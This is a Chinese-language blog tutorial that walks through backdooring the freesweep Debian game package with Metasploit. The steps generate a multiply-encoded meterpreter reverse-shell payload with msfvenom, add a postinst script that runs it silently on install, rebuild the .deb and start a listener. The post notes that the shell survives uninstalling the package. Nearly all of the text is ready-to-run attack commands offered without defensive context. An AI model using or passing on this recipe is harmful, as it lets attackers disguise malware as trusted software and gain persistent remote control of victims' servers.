---
title: "制作恶意deb软件包获取服务器权限"
date: 2020-02-23T20:41:02+08:00
author: 姚先生
categories: ['Kali']
tags: ['安全渗透']
---



Metasploit制作恶意deb软件包获取服务器权限

<!--more-->



## 实验步骤

* 制作恶意软件包使用--download-only 方式下载freesweep软件包不进行安装 

  ~~~
  apt --download-only install freesweep
  ~~~

* 查询下载下来的freesweep软件包并移动到指定目录

  ~~~
   cd /var/cache/apt/archives
   ls | grep freesweep
   mv /var/cache/apt/archives/freesweep_1.0.1-1_amd64.deb /
  ~~~

*  解压freesweep软件包到free目录 

  ~~~
cd /
dpkg -x freesweep_1.0.1-1_amd64.deb free
  ~~~

*  生成恶意代码到软件包源文件中

  ~~~
  msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp -b "\x00" -i 10  -e x86/shikata_ga_nai  LHOST=192.168.1.130 LPORT=4444 | msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp -b "\x00" -i 10  -e x86/xor_dynamic | msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp -b "\x00" -i 10  -e x86/call4_dword_xor -f elf -o /free/usr/share/freesweep_source
  ~~~

* 创建软件包信息目录 

  ~~~
  mkdir /free/DEBIAN
  ~~~

  ![](http://junmoxiao.org.cn/20200223212844.png)

* 创建软件包信息文件

~~~
tee /free/DEBIAN/control << 'EOF'
Package: freesweep 
Version: 0v1
Section: Games and Amusement 
Priority: optional 
Architecture: amd64 
Maintainer: Ubuntu MOTU Developers 
Description: freesweep_source
EOF
~~~

* 创建deb软件包安装后脚本文件，加载后门 

~~~
tee /free/DEBIAN/postinst << 'EOF'
sudo chmod 755 /usr/share/freesweep_source
sudo /usr/share/freesweep_source &  
EOF 
# &是将命令放到后台运行
~~~

* 给脚本文件添加执行权限

~~~
chmod 755 /free/postinst
~~~

* 构建新的deb安装包

  ~~~
  dpkg-deb --build /free/
  # 会在当前目录下生成构建的软件包free.deb,我们当前的目录是/ 
  ~~~

* 启动msf开启监听

~~~
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.130
run
background
~~~

* 目标机安装安装包

  ~~~
  dpkg -i free.deb 
  ~~~

* 目标机删除安装包和卸载软件包 # 恶意软件包被卸载，payload 依旧正常运行

  ~~~
  rm -rf  free.deb
  dpkg -r free
  ~~~

  